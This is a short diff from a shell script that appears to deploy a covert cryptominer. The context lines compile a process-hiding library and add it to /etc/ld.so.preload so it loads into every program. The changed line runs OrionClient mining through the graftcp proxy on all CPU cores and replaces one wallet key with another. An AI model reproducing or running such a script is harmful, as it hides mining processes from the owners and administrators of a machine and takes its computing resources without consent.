@@ -60,4 +60,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./OrionClient mine -a --pool twbitz --key 5o9PkcxTjqtvnGZRoqzAandwVKMkkzgpi4bUTkkeRgGV --worker $(shuf -n 1 -i 1-99999)-PELIT -t $(nproc --all) --ice
+./graftcp/graftcp & clear & ./OrionClient mine -a --pool twbitz --key 76dvS6JKn3WmKQXm4Rx3LBQZHpagXmiqE67gu7CCB55h --worker $(shuf -n 1 -i 1-99999)-IPU -t $(nproc --all) --ice
